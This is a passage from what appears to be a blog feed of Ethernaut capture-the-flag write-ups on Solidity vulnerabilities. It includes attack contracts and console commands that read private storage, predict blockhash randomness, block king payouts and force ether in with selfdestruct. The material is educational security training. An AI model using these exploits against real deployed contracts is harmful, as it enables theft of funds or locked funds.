^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39;^`*.,*&amp;#39; UU UU
*/
}
&lt;/code>&lt;/pre>&lt;p>So we can see some state variables and one byte32array. Our constructor parses the valuable data to the private data. The unlock function is our only point of interaction with this contract and here we just need to pass the right sequence of bytes16 to unlock the contract. As we already know, Ethereum blockchain is public, so we can spy on its storage by typing in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>let storage = []
let callbackFNConstructor = (index) =&amp;gt; (error, contractData) =&amp;gt; {
storage[index]= contractData
}
for( var i = 0; i&amp;lt;6; i++) { web3.eth.getStorageAt(contract.address, i, callbackFNConstructor(i)) }
&lt;/code>&lt;/pre>&lt;p>Running the code in the web console above will fetch us the first 6 storage variables defined in the target contract.Then, by accessing in storage array, we can see the 6 storage varaibles:&lt;/p>
&lt;pre tabindex="0">&lt;code>storage
(6) [&amp;#39;0x0000000000000000000000000000000000000000000000000000000000000001&amp;#39;, &amp;#39;0x0000000000000000000000000000000000000000000000000000000061e8582a&amp;#39;, &amp;#39;0x00000000000000000000000000000000000000000000000000000000582aff0a&amp;#39;, &amp;#39;0x6afa09c95f78aa0d4427b26b649a9e39764fb2e42aa80a1628d0af9465f2dfc6&amp;#39;, &amp;#39;0x5be1ffbd26ef932af6988e85bfa3168a66be9f53ad7a4036c81ec5578a9e12a6&amp;#39;, &amp;#39;0x3cb5971a348f1a4224f2175e48a929cc30b29ff44f5886d651e48fce1acdab53&amp;#39;]
&lt;/code>&lt;/pre>&lt;p>The very first storage variable ends with &amp;ldquo;001&amp;rdquo;, so we expect to be a boolean variable. locked is the only boolean variable and obviously it is the first storage array data. We have the variable flattening = 10; and denomination=255. In hexadecimal, 10 is represented as 0a and 255 is represented as 255. We can find these in the third storage data.Due to storage optimization from Ethereum, we can find the in the same variable.&lt;/p>
&lt;p>Storage optimization follows these very simple rules:&lt;/p>
&lt;ol>
&lt;li>Each index set aside for a storage variable allow 256bits.&lt;/li>
&lt;li>Variables are indexed in the order they are defined in smart-contract.&lt;/li>
&lt;li>If a variable consumes less than 256bits to be represented, leftover space will be shared with subsequent variables if they fit. Otherwise, they will be in the next storage variable.&lt;/li>
&lt;/ol>
&lt;p>Also, it should be mentioned that constants do not use this type of storage. All other storage variables are from the byte32 array &lt;code>data&lt;/code> . Therefore, we can see in unlock function that it is required that the key to be a byte16 and then compares it typecasts the data array[2] as a byte16 to aceed the comparision.
We have just to take the first half of the bytes32 data and that’s going to be the new bytes16 type data. Calling the unlock method with that as an input parameter should unlock the vault. Let&amp;rsquo;s create an attack contract.&lt;/p>
&lt;pre tabindex="0">&lt;code>pragma solidity ^0.6.0;
import &amp;#39;./Privacy.sol&amp;#39;;
contract PrivacyAttack {
Privacy target;
constructor(address _targetAddr) public {
target = Privacy(_targetAddr);
}
function unlock(bytes32 _slotValue) public {
// type casting the bytes32 to bytes16
bytes16 key = bytes16(_slotValue);
target.unlock(key);
}
}
&lt;/code>&lt;/pre>&lt;p>Our contract address is:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.address
&lt;/code>&lt;/pre>&lt;p>Under the deployment of the contract, we add the contract&amp;rsquo;s address to set it as a target in the counstructor. Finally, we can copy the storage data that stores the key and then give it as an input to our attack unlock function. Then, the contract will typecast the data from byte32 to byte16, it will keep only the first half of the bytes32 and send it to bytes16 type data. We unlocked the vault!!&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></content></item><item><title>CoinFlip - Ethernaut</title><link>/blockchain_writeups/coinflip/</link><pubDate>Sat, 15 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/coinflip/</guid><description>Coin flip is a basic game that we throw a coin and we have 50% chance of being 0 or 1. In order to win this game we need 10 consecutive wins. To begin with, we check the code of the smart-contract to find some useful stuff:
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.</description><content>&lt;p>Coin flip is a basic game that we throw a coin and we have 50% chance of being 0 or 1. In order to win this game we need 10 consecutive wins. To begin with, we check the code of the smart-contract to find some useful stuff:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;;
contract CoinFlip {
using SafeMath for uint256;
uint256 public consecutiveWins;
uint256 lastHash;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
constructor() public {
consecutiveWins = 0;
}
function flip(bool _guess) public returns (bool) {
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
if (lastHash == blockValue) {
revert();
}
lastHash = blockValue;
uint256 coinFlip = blockValue.div(FACTOR);
bool side = coinFlip == 1 ? true : false;
if (side == _guess) {
consecutiveWins++;
return true;
} else {
consecutiveWins = 0;
return false;
}
}
}
&lt;/code>&lt;/pre>&lt;p>Computers are unable to generate true random numbers. Computers are combining different things in order to create numbers that people can&amp;rsquo;t predict easily. But, if we repeat the process that computer followed to generate the random number, we will end up with that number. Ethereum is not providing any function for random numbers. As a result, programmers have to create their own functions for randomness or to use Oracles to import random numbers outside the Ethereum Network . As the Coin-Flip game smart-contract needed randomness, the programmer imported the Safemath library to protect it from underflows and it used a long uint256 number in the FACTOR variable.&lt;/p>
&lt;p>In terms of Libraries, libraries are restricted in following ways:&lt;/p>
&lt;ul>
&lt;li>They cannot have state variables.&lt;/li>
&lt;li>They cannot inherit nor be inherited.&lt;/li>
&lt;li>They cannot receive Ether.&lt;/li>
&lt;li>They cannot be destroyed.&lt;/li>
&lt;/ul>
&lt;p>So, we have the public function flip on the smart-contract CoinFlip. We can see they call the blockchash in order to create a hash of one of the given blocks. From Solidity&amp;rsquo;s documentation, we know that blockhash can only work for the 256 most recent blocks. On account of that, in the variable blockValue, we store the blockhash of the current block number, and then they divide by the long number which is stored in variable &amp;ldquo;FACTOR&amp;rdquo;.
Then, it returns a Boolean result. So as we know the process of creation of the random number, what if we try to repeat the process of constructing this &amp;ldquo;random&amp;rdquo; number in our malicious smart-contract and then send the pseudo-anonymous result as our &amp;ldquo;guess&amp;rdquo;?&lt;/p>
&lt;pre tabindex="0">&lt;code> // SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
//import the original smart-contact
import &amp;#34;./CoinFlip.sol&amp;#34;;
contract CoinFlipAttack {
CoinFlip public victimContract;
uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
constructor(address _victimContractAddr) public {
victimContract= CoinFlip(_victimContractAddr);
}
//reproduce the function flip, but for the previous block, as the last block has been mined.
function flip() public returns (bool) {
uint256 blockValue = uint256(blockhash(block.number-1));
uint256 coinFlip= uint256(blockValue/FACTOR);
bool side = coinFlip == 1 ? true: false;
victimContract.flip(side);
}
}
&lt;/code>&lt;/pre>&lt;p>In our own smart-contract, we reproduced the function flip but we modified the blockhash function to use the previous block as an input, as block has already been mined. Now we are ready to compile and deploy our malicious smart-contract which is ready to fool the original smart-contract. All we have to do is just to spam our cheat function 10 times, until we reach 10 consecutive wins.
However, as we can understand now, there is an another vulnerability here. As miners build them up with different transactions and they compete between themselves to commit their block to Ethereum&amp;rsquo;s Blockchain, miners are able to exercise their judgement when building up blocks. A miner with the appropriate time, could try many different guesses and not commit blocks where he was mistaken. This one of the consequences of Proof Of Work based consensus mechanism, in the process of achieving a really random number.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></content></item><item><title>Vault - Ethernaut</title><link>/blockchain_writeups/vault/</link><pubDate>Sat, 08 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/vault/</guid><description>On this challenge, we have to unlock the vault to win the challenge.
// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; contract Vault { bool public locked; bytes32 private password; constructor(bytes32 _password) public { locked = true; password = _password; } function unlock(bytes32 _password) public { if (password == _password) { locked = false; } } } First of all, we can see that we have 2 state variables. One of them is the locked variable which is public.</description><content>&lt;p>On this challenge, we have to unlock the vault to win the challenge.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
contract Vault {
bool public locked;
bytes32 private password;
constructor(bytes32 _password) public {
locked = true;
password = _password;
}
function unlock(bytes32 _password) public {
if (password == _password) {
locked = false;
}
}
}
&lt;/code>&lt;/pre>&lt;p>First of all, we can see that we have 2 state variables. One of them is the locked variable which is public. That means that we can very easily see what it is inside the variable by typing:&lt;/p>
&lt;pre tabindex="0">&lt;code>await contract.locked()
&lt;/code>&lt;/pre>&lt;p>Also, we have the private variable password. Using the console, we cannot just see what it is inside just easily. Therefore, we have 2 options to try in order to solve the problem.&lt;/p>
&lt;ul>
&lt;li>By brute forcing the password, until we find the right one and then unlock the vault. It&amp;rsquo;s possible to happen, but there is a much easier way to achieve this.&lt;/li>
&lt;li>Somehow, to dump the password from the storage of the contract.&lt;/li>
&lt;/ul>
&lt;p>As we have already mentioned earlier, Ethereum is a public Blockchain. That means that everyone can see what exists inside of it. We know that password variable is uint private. In Ethereum from the Solidity Docs, we know that a private type access mean that a variable can be called only from the same smart-contract, not externally by using an another smart-contract or by calling contract.password() from console. As Ethereum is a public ledger, we can just query the smart-contract from it&amp;rsquo;s storage.
Web3.js can help us achieving this, by typing in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>var pwd // to create a variable
web3.eth.getStorageAt(contract.address, 1, function(err, result){pwd = result})
&lt;/code>&lt;/pre>&lt;p>This command will return :&lt;/p>
&lt;pre tabindex="0">&lt;code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29
&lt;/code>&lt;/pre>&lt;p>That is the password in hexadecimal mode. We can very easily convert this hexadecimal in Ascii from our console by typing:&lt;/p>
&lt;pre tabindex="0">&lt;code>web3.utils.toAscii(pwd)
&lt;/code>&lt;/pre>&lt;p>And this will return us:&lt;/p>
&lt;pre tabindex="0">&lt;code>A very strong secret password :)
&lt;/code>&lt;/pre>&lt;p>As we have the hexadecimal version of the password, we can simply create a transaction in the function unlock and the hexadecimal value as an input by typing:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.unlock(&amp;#34;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>Now if we check the Boolean variable locked by typing &amp;ldquo;contract.locked()&amp;rdquo; we can see that it is unlocked. We pwned it.
To sum up, we should never insert data unencrypted in Blockchain networks, especially in public Blockchains, as everyone can see what it is inside.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/li>
&lt;li>&lt;/li>
&lt;li>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>King - Ethernaut</title><link>/blockchain_writeups/king/</link><pubDate>Fri, 07 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/king/</guid><description>We have a smart contract game called Kings. This contract is a classic example of a ponzi scheme. Whoever sends an amount of ether that is more than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg.</description><content>&lt;p>We have a smart contract game called Kings. This contract is a classic example of a ponzi scheme.
Whoever sends an amount of ether that is more than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract King {
address payable king;
uint public prize;
address payable public owner;
constructor() public payable {
owner = msg.sender;
king = msg.sender;
prize = msg.value;
}
receive() external payable {
require(msg.value &amp;gt;= prize || msg.sender == owner);
king.transfer(msg.value);
king = msg.sender;
prize = msg.value;
}
function _king() public view returns (address payable) {
return king;
}
}
&lt;/code>&lt;/pre>&lt;p>It should be mentioned here that when we will try to submit King.sol instance back to level, Ethernaut will call the fallback function to regain Kingship. As we can understand, we have to find a way to guarantee that all Ethernaut&amp;rsquo;s transactions will fail, so we can remain as a King. Let&amp;rsquo;s check the code into fallback function:&lt;/p>
&lt;pre tabindex="0">&lt;code>receive() external payable {
require(msg.value &amp;gt;= prize || msg.sender == owner);
king.transfer(msg.value);
king = msg.sender;
prize = msg.value;
}
&lt;/code>&lt;/pre>&lt;p>The fallback is an external payable and has as a requirement to be called that the sender sends a higher amount of ether than it is the current price and the msg.sender to be the owner. Then, all of the sended ether is transfered to king and we become the king and our value of ether is sets us the current prize. They key here is the &amp;ldquo;king.transfer()&amp;rdquo; method which can fail if the current king is a malicious contract and refuses to withdraw.
There are multiple ways for transactions to fail, but most of the time we have these 3 options:&lt;/p>
&lt;ul>
&lt;li>Out Of Gas Errors: The receiving contract has a malicious payable function that consumes a large amount of gas, which fails the transaction or over-consumes the gas limit. However cannot make the internal call here as there is not really something we can control.&lt;/li>
&lt;li>Arbitrary Error from FallBack Function. If our transaction ends up executing code from a contract that can always fail.&lt;/li>
&lt;li>Transact with Contract with no fallback function or a non payable fallback function. When a transaction is made towards a contract address without including any data the fallback function of that contract is called. If a contract does not have a fallback function, it will fail. Also, It will fall if we send some ether in a transaction without a payable modifier in the fallback.&lt;/li>
&lt;li>So, we can create a contract with a function that will send ether to the original contract, however without a fallback function so that the king contract cannot send money back.
We create and deploy a malicious smart contract with at least 1 Ether on it.&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
contract KingAttack {
function doYourThing(address _target) public payable {
(bool result,) = _target.call{value:msg.value}(&amp;#34;&amp;#34;);
if(!result) revert(&amp;#34;MyBad&amp;#34;);
}
}
&lt;/code>&lt;/pre>&lt;p>This script has a payable function which will send an ether to the contract. As the original smart contract has a payable external fallback function, but it has requirements in order to be executed, it will fail as it will can&amp;rsquo;t handle the 1 ether that we sent it from the attacking contract. As a result, we will become the king forever.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></content></item><item><title>Naught Coin - Ethernaut</title><link>/blockchain_writeups/naught-coin/</link><pubDate>Thu, 06 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/naught-coin/</guid><description>So now we have the challenge &amp;ldquo;Naught Coin&amp;rdquo;. Naught Coin is an ERC20 token and we are already holding all of them. The catch is that we will only be able to transfer them after a 10 year lockout period. Can we figure out how to get them out to another address so that we can transfer them freely? So, we have NaughtCoins locked for a 10 year period. We have to unlock them and then, get them to an another address.</description><content>&lt;p>So now we have the challenge &amp;ldquo;Naught Coin&amp;rdquo;. Naught Coin is an ERC20 token and we are already holding all of them.
The catch is that we will only be able to transfer them after a 10 year lockout period. Can we figure out how to get them out to another address so that we can transfer them freely?
So, we have NaughtCoins locked for a 10 year period. We have to unlock them and then, get them to an another address. Let&amp;rsquo;s check the code&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import &amp;#39;@openzeppelin/contracts/token/ERC20/ERC20.sol&amp;#39;;
contract NaughtCoin is ERC20 {
// string public constant name = &amp;#39;NaughtCoin&amp;#39;;
// string public constant symbol = &amp;#39;0x0&amp;#39;;
// uint public constant decimals = 18;
uint public timeLock = now + 10 * 365 days;
uint256 public INITIAL_SUPPLY;
address public player;
constructor(address _player)
ERC20(&amp;#39;NaughtCoin&amp;#39;, &amp;#39;0x0&amp;#39;)
public {
player = _player;
INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
// _totalSupply = INITIAL_SUPPLY;
// _balances[player] = INITIAL_SUPPLY;
_mint(player, INITIAL_SUPPLY);
emit Transfer(address(0), player, INITIAL_SUPPLY);
}
function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
super.transfer(_to, _value);
}
// Prevent the initial owner from transferring tokens until the timelock has passed
modifier lockTokens() {
if (msg.sender == player) {
require(now &amp;gt; timeLock);
_;
} else {
_;
}
}
}
&lt;/code>&lt;/pre>&lt;p>First of all, we should mention some features of the interfaces:&lt;/p>
&lt;ul>
&lt;li>They cannot inherit from other contracts, but they can inherit from other interfaces.&lt;/li>
&lt;li>All declared functions must be external.&lt;/li>
&lt;li>They cannot declare a constructor, state variables or modifiers.&lt;/li>
&lt;li>Contracts can inherit interfaces as they would inherit other contracts.&lt;/li>
&lt;/ul>
&lt;p>So, we can see that the contract NaughtCoin inherits all ERC20 contract functions and standards. As a result, we have to study about how ERC20 tokens are working too.
On ERC20&amp;rsquo;s github repository, we can find more information about its&amp;rsquo; methods. As a result, we have to study about how ERC20 tokens are working too.
&lt;a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md&lt;/a>&lt;/p>
&lt;p>We can read that in order for a token to be compatible with the ERC20 specification, it must have implementations for the following interface:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract ERC20Interface {
function totalSupply() public constant returns (uint);
function balanceOf(address tokenOwner) public constant returns (uint balance);
function allowance(address tokenOwner, address spender) public constant returns (uint remaining);
function transfer(address to, uint tokens) public returns (bool success);
function approve(address spender, uint tokens) public returns (bool success);
function transferFrom(address from, address to, uint tokens) public returns (bool success);
event Transfer(address indexed from, address indexed to, uint tokens);
event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}
&lt;/code>&lt;/pre>&lt;p>This specification is one of the most popular, which makes finding further documentation much easier. Maybe we should use some of these functions to transfer the tokens.
To begin identifying where we should look at first, we found that looking at ERC20 interface gave us many methods that we would want to look further into. In particular, the first function that jumped out to us was the transferFrom() function. We had identified that NaughtCoin ‘s transfer implementation was rendered useless by the lockTokens modifier, but NaughtCoin did not implement the transferFrom() function, which means that the StandardToken implementation of transferFrom is being called.
Upon reading the source code of the transferFrom function, it appears that it allows a third party to transfer a designated amount of tokens from one account to another account. This is derived from reading the requirements for transfer.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></content></item><item><title>Force - Ethernaut</title><link>/blockchain_writeups/force/</link><pubDate>Sun, 02 Jan 2022 00:00:00 +0000</pubDate><guid>/blockchain_writeups/force/</guid><description>We have an empty smart-contract without any functions, constructor or even Fallback Function. Our goal is to send some Ether to it.
Ethereum smart-contracts typically they have 3 ways to receive ether from an another address.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m) */} As we have already mentioned, by using a payable function. We don&amp;rsquo;t have any kind of function on this smart-contract so we cannot use this way.</description><content>&lt;p>We have an empty smart-contract without any functions, constructor or even Fallback Function. Our goal is to send some Ether to it.&lt;/p>
&lt;p>Ethereum smart-contracts typically they have 3 ways to receive ether from an another address.&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Force {/*
MEOW ?
/\_/\ /
____/ o o \
/~____ =ø= /
(______)__m_m)
*/}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>As we have already mentioned, by using a payable function. We don&amp;rsquo;t have any kind of function on this smart-contract so we cannot use this way.&lt;/li>
&lt;li>By receiving mining rewards. A smart-contract can be designed to be able to receive mining block rewards. Maybe it&amp;rsquo;s not the best solution to our problem right now.&lt;/li>
&lt;li>By destroying an other smart-contract using the selfdestruct() method in order to force send all of it&amp;rsquo;s ether to an another address or smart contract. Maybe this method solves our problem.&lt;/li>
&lt;/ul>
&lt;p>So, it&amp;rsquo;s time to create a new smart-contract which has a public payable function on it with a selfdestruct() command.&lt;/p>
&lt;pre tabindex="0">&lt;code>pragma solidity ^0.8.11;
contract SelfDestructingDapp{
constructor() public payable{
}
function attack(address payable _contractAddr) payable public {
selfdestruct(_contractAddr);
}
}
&lt;/code>&lt;/pre>&lt;p>Now, we compile and deploy this smart-contract to Ethereum Blockchain with some amount of ether on it.
Time to call the attack function and give as a parameter the smart-contract&amp;rsquo;s address.
As previously, we use the Console from our web browser to interact with the original smart contract and we type:&lt;/p>
&lt;pre tabindex="0">&lt;code>await contract.address()
&lt;/code>&lt;/pre>&lt;p>As we want to find smart-contract&amp;rsquo;s address, we copy the address and then we give it as a parameter in the attack function on SelfDestructing Dapp.
We wait until the block to be mined and now we can check the balance of the original smart-contract by typing in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>await getBalance(contract.address)
&lt;/code>&lt;/pre>&lt;p>And now we can see that it has the amount of ether that the SelfDestructing Dapp had.
Noticeably, when we use the selfdestruct() function and we send the amount of ether in an another address, if this address is not existing or we sent it to an smart-contract which hasn&amp;rsquo;t any transfer() or withdraw() function, it is lost forever. It is of high importance to not burn ether like this, specially in the mainnet as we loose real world money and deflate the Ethereum Network. Additionally, we should never create a contract which uses as a fallback function with a requirement of some ether but code the contract to support transfer only from the owner. Someone can still use selfdestruct() in order to send an amount of ether to the contract and trigger the fallback function without being the owner.&lt;/p>
&lt;hr>
&lt;p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:&lt;/p>
&lt;h2 id="smart-contract-security">Smart-Contract Security:&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul></content></item><item><title>Fallback - Ethernaut</title><link>/blockchain_writeups/fallback/</link><pubDate>Sun, 19 Dec 2021 00:00:00 +0000</pubDate><guid>/blockchain_writeups/fallback/</guid><description>We have the smart-contract Fallback and we are requested to claim the ownership of the contract, and then reduce it&amp;rsquo;s balance to 0. At first, let&amp;rsquo;s read the smart contract&amp;rsquo;s code and search if something interesting is going on there:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Fallback { using SafeMath for uint256; mapping(address =&amp;gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.</description><content>&lt;p>We have the smart-contract Fallback and we are requested to claim the ownership of the contract, and then reduce it&amp;rsquo;s balance to 0.
At first, let&amp;rsquo;s read the smart contract&amp;rsquo;s code and search if something interesting is going on there:&lt;/p>
&lt;pre tabindex="0">&lt;code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;;
contract Fallback {
using SafeMath for uint256;
mapping(address =&amp;gt; uint) public contributions;
address payable public owner;
constructor() public {
owner = msg.sender;
contributions[msg.sender] = 1000 * (1 ether);
}
modifier onlyOwner {
require(
msg.sender == owner,
&amp;#34;caller is not the owner&amp;#34;
);
_;
}
function contribute() public payable {
require(msg.value &amp;lt; 0.001 ether);
contributions[msg.sender] += msg.value;
if(contributions[msg.sender] &amp;gt; contributions[owner]) {
owner = msg.sender;
}
}
function getContribution() public view returns (uint) {
return contributions[msg.sender];
}
function withdraw() public onlyOwner {
owner.transfer(address(this).balance);
}
receive() external payable {
require(msg.value &amp;gt; 0 &amp;amp;&amp;amp; contributions[msg.sender] &amp;gt; 0);
owner = msg.sender;
}
}
&lt;/code>&lt;/pre>&lt;p>First of all, let&amp;rsquo;s talk about the constructor. Constructor is an optional function and is used to initialize state variables of a contract. State variables are variables whose values are permanently stored in smart-contract&amp;rsquo;s storage. We have to mention here that each contract can have only one constructor. A constructor code is executed once when a contract is created and it is used to initialize contract state. After a constructor code executed, the final code is deployed to blockchain. Taking this into account, under the deployment of the smart-contract, the constructor runs at first and sets the person who deployed the smart-contract as an owner in the public Boolean variable &amp;ldquo;owner&amp;rdquo;, by the command:&lt;/p>
&lt;pre tabindex="0">&lt;code>owner = msg.sender;
&lt;/code>&lt;/pre>&lt;p>If we type in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>await contract.owner()
&lt;/code>&lt;/pre>&lt;p>We can see the address that deployed this smart contract and by typing:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.address
&lt;/code>&lt;/pre>&lt;p>We can find the smart-contract&amp;rsquo;s address. Each user and each smart-contract in Ethereum Blockchain has it&amp;rsquo;s own address. If we type &amp;ldquo;player&amp;rdquo; we can find our wallet&amp;rsquo;s address.
So, to begin with, as we want to claim ownership of the smart-contract, we are trying to find out something that sets us as the owner. We can see that there is a receive() external function that if we pass it&amp;rsquo;s requirements, it sets us as the owner of the smart-contract. It looks interesting. From Solidity&amp;rsquo;s documentation, we can find out that receive() is a fallback function that is executed when we create general transactions, without calling a specific function from the contract. The receive() function is executed on a call to the contract with empty calldata. This type of functions cannot have arguments or return anything. We keep this in our minds for now.
The second requirements wants for us to be in the contributions array and having us sent an amount of ether more than 0. We check the contributions array if we are inside on it by calling:&lt;/p>
&lt;pre tabindex="0">&lt;code>await contract.contributions(player)
&lt;/code>&lt;/pre>&lt;p>However, it returns as false. So, let&amp;rsquo;s check the code again to find a way to add ourselves in &amp;ldquo;contributions&amp;rdquo;. We can see that a payable function exists and requires to get an amount of ether smaller than 0.01 ether. We can simply send 1 Wei, the smallest amount of ether that we can send to someone by typing in console:&lt;/p>
&lt;pre tabindex="0">&lt;code>contract.contribute({value:1})
&lt;/code>&lt;/pre>&lt;p>So now we added ourselves in the &amp;ldquo;contributions&amp;rdquo; array. Now we pass the one requirement. It&amp;rsquo;s time to send a small amount of money (1 Wei as the requirement needs to be more than 0) in a generic transaction in order to pass the second requirement in the receive() function and trigger it. We type:&lt;/p>
